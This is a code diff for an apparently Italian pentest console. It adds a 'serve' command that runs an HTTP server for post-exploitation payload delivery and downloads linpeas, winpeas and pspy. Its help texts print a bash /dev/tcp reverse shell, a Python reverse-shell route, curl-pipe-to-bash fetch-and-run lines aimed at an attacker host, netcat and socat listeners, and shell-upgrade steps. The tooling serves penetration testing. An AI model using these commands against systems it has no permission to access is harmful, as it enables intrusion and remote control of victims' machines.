@@ -13,6 +13,8 @@ from dataclasses import dataclass, field
 from pathlib import Path
 from shutil import get_terminal_size, which
 
+from http_server import start as _serve_start, stop as _serve_stop, status as _serve_status, fetch_tools as _serve_fetch, list_static as _serve_list_static
+
 try:
     import readline  # type: ignore
 except ImportError:
@@ -213,6 +215,12 @@ def print_help_text() -> None:
     print("  notes <argomento>  Mostra una nota/guida (es. footprinting)")
     print("  notes list         Elenca le note disponibili")
     print("  find <parola>      Cerca un testo in vuln, tool e notes")
+    print("  serve on           Avvia il server HTTP di delivery in background")
+    print("  serve off          Arresta il server HTTP")
+    print("  serve fetch        Scarica linpeas, winpeas, pspy e altri tool")
+    print("  serve list         Elenca i file in static/")
+    print("  serve status       Mostra lo stato del server")
+    print("  serve help [cat]   Guida: upgrade (u), rev (r), sh, static (s)")
     print("  help               Mostra questo aiuto")
     print("  back               Torna alla console principale")
     print("  exit               Esci da " + APP_NAME)
@@ -337,6 +345,13 @@ def build_parser() -> argparse.ArgumentParser:
     notes_p.add_argument("topic", nargs="+")
     find_p = subparsers.add_parser("find")
     find_p.add_argument("query", nargs="+")
+    serve_p = subparsers.add_parser("serve", add_help=False)
+    serve_p.add_argument("action", nargs="?", default="status")
+    serve_p.add_argument("subtopic", nargs="?", default=None)
+    serve_p.add_argument("--port", type=int, default=8000)
+    serve_p.add_argument("--lhost", default=None)
+    serve_p.add_argument("--lport", type=int, default=4444)
+    serve_p.add_argument("--force", action="store_true", default=False)
     return parser
 
 
@@ -382,6 +397,7 @@ def run_command(argv: list[str], state: ConsoleState | None = None) -> int:
         "vuln": cmd_vuln,
         "notes": cmd_notes,
         "find": cmd_find,
+        "serve": cmd_serve,
     }
     handler = handlers.get(args.command)
     if handler is None:
@@ -428,6 +444,9 @@ def run_console() -> int:
         if not argv:
             continue
 
+        if argv[0] == "serve" and len(argv) >= 2 and argv[1] in {"-h", "--help"}:
+            argv = ["serve", "help"] + argv[2:]
+
         if state.current_tool is not None and argv[0] == "install" and len(argv) == 1:
             rc = run_install(state.current_tool)
             if rc != 0:
@@ -452,7 +471,7 @@ def run_console() -> int:
                     state.last_vuln_tools = _extract_vuln_tools(text)
                 continue
 
-        known_commands = {"sealsay", "list", "install", "use", "search", "vuln", "notes", "find", "back", "help", "?", "--version", "-h", "--help"}
+        known_commands = {"sealsay", "list", "install", "use", "search", "vuln", "notes", "find", "back", "help", "?", "--version", "-h", "--help", "serve"}
         if argv[0] not in known_commands:
             print("Comando non riconosciuto. Digita 'help' per i comandi.")
             continue
@@ -833,6 +852,190 @@ def _render_highlighted(text: str, query: str) -> None:
             print(highlighted)
         else:
             print(line)
+
+
+def _serve_help_main() -> None:
+    render_markdown(r"""# Quick-Delivery Server
+
+Server HTTP in background per post-exploitation.
+Serve payload dinamici e file statici via `curl` dal target.
+
+## Comandi
+
+| Comando | Descrizione |
+|---------|-------------|
+| `serve on [--port N] [--lhost IP] [--lport N]` | Avvia (default: porta 8000, IP auto) |
+| `serve off` | Arresta |
+| `serve status` | Mostra stato corrente |
+| `serve fetch [--force]` | Scarica i tool di post-exploitation in `static/` |
+| `serve list` | Elenca i file in `static/` |
+
+## Categorie di help
+
+| Comando | Argomento |
+|---------|-----------|
+| `serve help upgrade` (o `u`) | Come fare l'upgrade di una shell instabile |
+| `serve help rev` (o `r`) | Reverse shell Bash |
+| `serve help sh` | Reverse shell Python |
+| `serve help static` (o `s`) | Gestione file statici e catalogo tool |
+""")
+
+
+def _serve_help_upgrade() -> None:
+    render_markdown(r"""# /upgrade — Upgrade Shell
+
+Trasforma una shell instabile (es. netcat `/bin/sh`) in una TTY interattiva.
+
+## Uso
+
+```bash
+curl http://<LHOST>:8000/upgrade | bash
+```
+
+## Prerequisito
+
+Avvia un listener **socat** sulla tua macchina prima di lanciare il curl:
+
+```bash
+socat file:$(tty),raw,echo=0 tcp-listen:4444
+```
+
+## Cosa fa lo script
+
+Tenta tre metodi in cascata:
+
+1. **socat locale** — se già installato sul target, upgrade immediato
+2. **socat statico** — scarica un binario precompilato, lo usa da `/tmp`
+3. **python pty** — fallback con `python3 -c "import pty; ..."`
+
+La connessione torna verso `LHOST:LPORT` configurati con `serve on`.
+""")
+
+
+def _serve_help_rev() -> None:
+    render_markdown(r"""# /rev — Reverse Shell Bash
+
+One-liner bash per ottenere una reverse shell.
+
+## Uso
+
+```bash
+curl http://<LHOST>:8000/rev | bash
+```
+
+## Prerequisito
+
+Listener sulla tua macchina:
+
+```bash
+nc -lvnp 4444
+```
+
+## Payload generato
+
+```bash
+bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
+```
+
+`LHOST` e `LPORT` sono quelli impostati con `serve on`.
+""")
+
+
+def _serve_help_sh() -> None:
+    render_markdown(r"""# /sh — Reverse Shell Python
+
+One-liner Python3 per ottenere una reverse shell.
+Utile quando bash non supporta `/dev/tcp` (es. Debian/Ubuntu con `dash`).
+
+## Uso
+
+```bash
+curl http://<LHOST>:8000/sh | bash
+```
+
+## Prerequisito
+
+```bash
+nc -lvnp 4444
+```
+
+## Quando usarlo
+
+- Il target ha Python3 ma non bash con `/dev/tcp`
+- Serve una shell più stabile rispetto a `/rev`
+""")
+
+
+def _serve_help_static() -> None:
+    from http_server import TOOL_CATALOG, STATIC_ROOT
+    lines = ["# static/ — File Statici\n"]
+    lines.append("Cartella che il server serve come download diretto.")
+    lines.append("Qualsiasi file dentro `static/` diventa scaricabile via HTTP.\n")
+    lines.append("## Comandi\n")
+    lines.append("| Comando | Descrizione |")
+    lines.append("|---------|-------------|")
+    lines.append("| `serve fetch` | Scarica tutti i tool del catalogo |")
+    lines.append("| `serve fetch --force` | Riscarica anche se già presenti |")
+    lines.append("| `serve list` | Mostra file e dimensioni |")
+    lines.append("| `cp file static/` | Aggiungi un file manualmente |\n")
+    lines.append("## Catalogo tool\n")
+    lines.append("| File | Descrizione |")
+    lines.append("|------|-------------|")
+    for entry in TOOL_CATALOG:
+        lines.append(f"| `{entry['name']}` | {entry['desc']} |")
+    lines.append("")
+    lines.append("## Dal target\n")
+    lines.append("```bash")
+    lines.append("curl http://<LHOST>:8000/linpeas.sh | bash")
+    lines.append("curl http://<LHOST>:8000/pspy64 -o pspy && chmod +x pspy")
+    lines.append("curl http://<LHOST>:8000/winPEASx64.exe -o wp.exe")
+    lines.append("```")
+    render_markdown("\n".join(lines))
+
+
+_SERVE_HELP_TOPICS: dict[str, callable] = {
+    "upgrade": _serve_help_upgrade,
+    "u": _serve_help_upgrade,
+    "rev": _serve_help_rev,
+    "r": _serve_help_rev,
+    "sh": _serve_help_sh,
+    "static": _serve_help_static,
+    "s": _serve_help_static,
+}
+
+
+def cmd_serve(args: argparse.Namespace, state: ConsoleState | None = None) -> int:
+    action = normalize(getattr(args, "action", "status"))
+    if action in {"help", "h", "-h", "--help"}:
+        subtopic = getattr(args, "subtopic", None)
+        if subtopic:
+            handler = _SERVE_HELP_TOPICS.get(normalize(subtopic))
+            if handler:
+                handler()
+            else:
+                print(f"Categoria sconosciuta: {subtopic}")
+                print("Categorie: upgrade (u), rev (r), sh, static (s)")
+        else:
+            _serve_help_main()
+        return 0
+    if action in {"on", "start"}:
+        port = getattr(args, "port", 8000)
+        lhost = getattr(args, "lhost", None)
+        lport = getattr(args, "lport", 4444)
+        print(_serve_start(port=port, lhost=lhost, lport=lport))
+        return 0
+    if action in {"off", "stop"}:
+        print(_serve_stop())
+        return 0
+    if action == "fetch":
+        force = getattr(args, "force", False)
+        print(_serve_fetch(force=force))
+        return 0
+    if action in {"list", "ls"}:
+        print(_serve_list_static())
+        return 0
+    print(_serve_status())
+    return 0
 
 
 def cmd_find(args: argparse.Namespace, state: ConsoleState | None = None) -> int:
